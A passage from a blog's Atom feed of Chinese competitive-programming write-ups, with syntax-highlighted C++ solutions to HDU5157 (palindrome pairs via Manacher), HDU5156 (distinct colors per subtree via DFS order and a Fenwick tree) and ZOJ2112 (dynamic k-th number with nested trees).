class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">210000</span>;</div><div class="line"><span class="keyword">char</span> s[N], str[N];</div><div class="line"><span class="keyword">int</span> n, p[N];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">KP</span><span class="params">(<span class="keyword">int</span> len, <span class="keyword">char</span> *str)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</div><div class="line">        s[<span class="number">2</span> * i + <span class="number">1</span>] = <span class="string">'#'</span>;</div><div class="line">        s[<span class="number">2</span> * i + <span class="number">2</span>] = str[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> n = <span class="number">2</span> * len;</div><div class="line">    s[<span class="number">0</span>] = s[n + <span class="number">1</span>] = <span class="string">'#'</span>;</div><div class="line">    s[n + <span class="number">2</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> mx = <span class="number">0</span>, id;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (mx &gt; i) p[i] = min(p[<span class="number">2</span> * id - i], mx - i);</div><div class="line">        <span class="keyword">else</span> p[i] = <span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span>(s[i + p[i]] == s[i - p[i]]) p[i]++;</div><div class="line">        <span class="keyword">if</span> (p[i] + i &gt; mx) &#123;</div><div class="line">            mx = p[i] + i;</div><div class="line">            id = i;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">ll pre[N / <span class="number">2</span>], suf[N / <span class="number">2</span>], sum[N / <span class="number">2</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%s"</span>, str)) &#123;</div><div class="line">        <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</div><div class="line">        KP(len, str);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= len + <span class="number">1</span>; i++) pre[i] = suf[i] = sum[i] = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">2</span> * len; i++) &#123;</div><div class="line">            <span class="keyword">int</span> x = i / <span class="number">2</span>;</div><div class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) pre[x]++, pre[x + (p[i] / <span class="number">2</span>)]--;</div><div class="line">            <span class="keyword">else</span> pre[x + <span class="number">1</span>]++, pre[x + (p[i] / <span class="number">2</span>) + <span class="number">1</span>]--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span> * len; i &gt;= <span class="number">2</span>; i--) &#123;</div><div class="line">            <span class="keyword">int</span> x = i / <span class="number">2</span>;</div><div class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) suf[x]++, suf[x - (p[i] / <span class="number">2</span>)]--;</div><div class="line">            <span class="keyword">else</span> suf[x]++, suf[x - (p[i] / <span class="number">2</span>)]--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &gt;= <span class="number">1</span>; i--) &#123;</div><div class="line">            suf[i] += suf[i + <span class="number">1</span>];</div><div class="line">            sum[i] += sum[i + <span class="number">1</span>] + suf[i];</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ll ans = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len; i++) &#123;</div><div class="line">            pre[i] += pre[i - <span class="number">1</span>];</div><div class="line">            ans += (ll)pre[i] * (sum[i + <span class="number">1</span>]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>, ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5157&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5157&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;有一个字符串s，问有多少对子串对(suba, subb)，使得suba和subb均为回文子串，且两个子串不能有重叠部分。&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;首先可以用Manacher算法预处理出以每个字符（包括两个字符之间的位置）为中心能有多少个回文串。然后用差分前缀处理处pre、suf、sum三个数组。&lt;br&gt;其中pre数组表示到以某个字符结尾的回文串个数，suf表示以某个字符为开头的回文串个数，sum表示以某个字符之后的所有字符为开头的回文串个数。&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="Manacher" scheme="http://yoursite.com/tags/Manacher/"/>
    
      <category term="差分前缀" scheme="http://yoursite.com/tags/%E5%B7%AE%E5%88%86%E5%89%8D%E7%BC%80/"/>
    
  </entry>
  
  <entry>
    <title>HDU5156 Harry and Christmas tree（dfs序+查询区间内有多少个数）</title>
    <link href="http://yoursite.com/2015/10/29/HDU5156/"/>
    <id>http://yoursite.com/2015/10/29/HDU5156/</id>
    <published>2015-10-29T14:00:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=5156" target="_blank" rel="external">http://acm.hdu.edu.cn/showproblem.php?pid=5156</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>有一颗树，每个节点上有一些颜色的礼物，现在问以每个节点为根的子树有多少种不同的颜色。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>先把每个节点相同的颜色去除，然后按照dfs序得到一个关于颜色的序列。问题就转化为查询若干个区间内有多少种不同的颜色。</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">50000</span> + <span class="number">10</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">500000</span> + <span class="number">10</span>;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; g[N], gift[N];</div><div class="line"><span class="keyword">int</span> st[N], ed[N], pos[N], ans[N], mp[<span class="number">2</span> * N], seq[M], s[M], nxt[M];</div><div class="line"><span class="keyword">int</span> tot, n, m;</div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123; <span class="comment">///按左区间从小到大排</span></div><div class="line">    <span class="keyword">return</span> st[a] &lt; st[b];</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123; <span class="comment">///按有区间从小到大排</span></div><div class="line">    <span class="keyword">return</span> ed[a] &lt; ed[b];</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> x &amp; -x;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> v)</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(p &lt;= tot) &#123;</div><div class="line">        s[p] += v;</div><div class="line">        p += lowbit(p);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(p &gt; <span class="number">0</span>) &#123;</div><div class="line">        res += s[p];</div><div class="line">        p -= lowbit(p);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> fa)</span> </span>&#123;</div><div class="line">    st[u] = tot + <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; gift[u].size(); i++) seq[++tot] = gift[u][i];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g[u].size(); i++) &#123;</div><div class="line">        <span class="keyword">int</span> v = g[u][i];</div><div class="line">        <span class="keyword">if</span> (v != fa) dfs(v, u);</div><div class="line">    &#125;</div><div class="line">    ed[u] = tot;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">    tot = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">        g[i].clear();</div><div class="line">        gift[i].clear();</div><div class="line">        pos[i] = i;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m)) &#123;</div><div class="line">        init();</div><div class="line">        <span class="keyword">int</span> u, v;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;u, &amp;v);</div><div class="line">            g[u].pb(v);</div><div class="line">            g[v].pb(u);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> mx = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span>(m--) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;u, &amp;v);</div><div class="line">            <span class="keyword">if</span> (find(gift[u].begin(), gift[u].end(), v) == gift[u].end()) gift[u].pb(v);</div><div class="line">            mx = max(mx, v);</div><div class="line">        &#125;</div><div class="line">        dfs(<span class="number">1</span>, <span class="number">-1</span>);</div><div class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (tot + <span class="number">5</span>));</div><div class="line">        <span class="built_in">memset</span>(mp, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>) * (mx + <span class="number">5</span>));</div><div class="line">        <span class="comment">///按右区间从小到大排</span></div><div class="line">        sort(pos + <span class="number">1</span>, pos + n + <span class="number">1</span>, cmp);</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= tot; i++) &#123;</div><div class="line">            <span class="keyword">if</span>(!mp[seq[i]]) &#123;</div><div class="line">                add(i, <span class="number">1</span>);</div><div class="line">                mp[seq[i]] = i; <span class="comment">///如果是第一次出现, mp[seq[i]]记录为当前位置</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> right = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            <span class="keyword">int</span> now = pos[i];</div><div class="line">            <span class="keyword">while</span>(right &lt;= ed[now]) &#123;</div><div class="line">                <span class="keyword">if</span>(mp[seq[right]] != right) &#123; <span class="comment">///如果不是第一次出现</span></div><div class="line">                    add(mp[seq[right]], <span class="number">-1</span>);  <span class="comment">///减去前一次出现的</span></div><div class="line">                    add(right, <span class="number">1</span>);</div><div class="line">                    mp[seq[right]] = right;   <span class="comment">///重新定义这个数最近一次出现位置</span></div><div class="line">                &#125;</div><div class="line">                right++;</div><div class="line">            &#125;</div><div class="line">            ans[now] = sum(ed[now]) - sum(st[now] - <span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">        ///按左区间从小到大排</span></div><div class="line"><span class="comment">        for (int i = 1; i &lt;= tot; i++) &#123;</span></div><div class="line"><span class="comment">            if (!mp[seq[i]]) &#123;</span></div><div class="line"><span class="comment">                mp[seq[i]] = i;</span></div><div class="line"><span class="comment">                add(i, 1);</span></div><div class="line"><span class="comment">            &#125;</span></div><div class="line"><span class="comment">        &#125;</span></div><div class="line"><span class="comment">        memset(mp, 0, sizeof(int) * (mx + 5));</span></div><div class="line"><span class="comment">        for (int i = tot; i &gt;= 1; i--) &#123;</span></div><div class="line"><span class="comment">            if (!mp[seq[i]]) nxt[i] = tot + 1;</span></div><div class="line"><span class="comment">            else nxt[i] = mp[seq[i]];</span></div><div class="line"><span class="comment">            mp[seq[i]] = i;</span></div><div class="line"><span class="comment">        &#125;</span></div><div class="line"><span class="comment">        sort(pos + 1, pos + n + 1, cmp1);</span></div><div class="line"><span class="comment">        int t = 1;</span></div><div class="line"><span class="comment">        for (int i = 1; i &lt;= n; i++) &#123;</span></div><div class="line"><span class="comment">            int now = pos[i];</span></div><div class="line"><span class="comment">            while(t &lt;= tot &amp;&amp; t &lt; st[now]) &#123;</span></div><div class="line"><span class="comment">                add(nxt[t++], 1);</span></div><div class="line"><span class="comment">            &#125;</span></div><div class="line"><span class="comment">            //cout&lt;&lt;now&lt;&lt;" "&lt;&lt;st[now]&lt;&lt;" "&lt;&lt;ed[now]&lt;&lt;endl;</span></div><div class="line"><span class="comment">            ans[now] = sum(ed[now]) - sum(st[now] - 1);</span></div><div class="line"><span class="comment">        &#125;</span></div><div class="line"><span class="comment">*/</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">printf</span>(<span class="string">"%d%c"</span>, ans[i], i == n ? <span class="string">'\n'</span> : <span class="string">' '</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.hdu.edu.cn/showproblem.php?pid=5156&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.hdu.edu.cn/showproblem.php?pid=5156&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;有一颗树，每个节点上有一些颜色的礼物，现在问以每个节点为根的子树有多少种不同的颜色。&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;先把每个节点相同的颜色去除，然后按照dfs序得到一个关于颜色的序列。问题就转化为查询若干个区间内有多少种不同的颜色。&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="数据结构" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="树状数组" scheme="http://yoursite.com/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
      <category term="dfs序" scheme="http://yoursite.com/tags/dfs%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>ZOJ2112 Dynamic Rankings（动态区间第K大 树状数组套主席树）</title>
    <link href="http://yoursite.com/2015/10/28/ZOJ2112/"/>
    <id>http://yoursite.com/2015/10/28/ZOJ2112/</id>
    <published>2015-10-28T14:00:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://acm.zju.edu.cn/onlinejudge/showProblem.do?problemCode=2112" target="_blank" rel="external">http://acm.zju.edu.cn/onlinejudge/showProblem.do?problemCode=2112</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>动态查询区间第K大数，带修改</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p><a href="http://www.cnblogs.com/Empress/p/4659824.html" target="_blank" rel="external">http://www.cnblogs.com/Empress/p/4659824.html</a><br>需要将询问离线处理，将一开始的数列用主席树维护。之后修改的部分用N个树状数组来维护，每次更新logn棵树。<br>时间复杂度：nlog^2n<br><a id="more"></a></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">60000</span> + <span class="number">10</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> lson l, m</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rson m + 1, r</span></div><div class="line"><span class="keyword">int</span> a[N], Hash[N];</div><div class="line"><span class="keyword">int</span> root[N], ln[N &lt;&lt; <span class="number">5</span>], rn[N &lt;&lt; <span class="number">5</span>], sum[N &lt;&lt; <span class="number">5</span>];</div><div class="line"><span class="keyword">int</span> S[N];</div><div class="line"><span class="keyword">int</span> n, m, tot;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></div><div class="line">    <span class="keyword">int</span> l, r, k;</div><div class="line">    <span class="keyword">bool</span> Q;</div><div class="line">&#125;op[<span class="number">10005</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> rt = ++tot;</div><div class="line">    sum[rt] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (l != r) &#123;</div><div class="line">        <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">        ln[rt] = build(lson);</div><div class="line">        rn[rt] = build(rson);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> rt;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> pre, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> x, <span class="keyword">int</span> val)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> rt = ++tot;</div><div class="line">    ln[rt] = ln[pre], rn[rt] = rn[pre], sum[rt] = sum[pre] + val;</div><div class="line">    <span class="keyword">if</span> (l &lt; r) &#123;</div><div class="line">        <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (x &lt;= m) ln[rt] = update(ln[pre], lson, x, val);</div><div class="line">        <span class="keyword">else</span> rn[rt] = update(rn[pre], rson, x, val);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> rt;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> x &amp; -x;</div><div class="line">&#125;</div><div class="line"><span class="keyword">int</span> use[N];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> pos, <span class="keyword">int</span> val)</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(x &lt;= n) &#123;</div><div class="line">        S[x] = update(S[x], <span class="number">1</span>, m, pos, val);</div><div class="line">        x += lowbit(x);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line">    <span 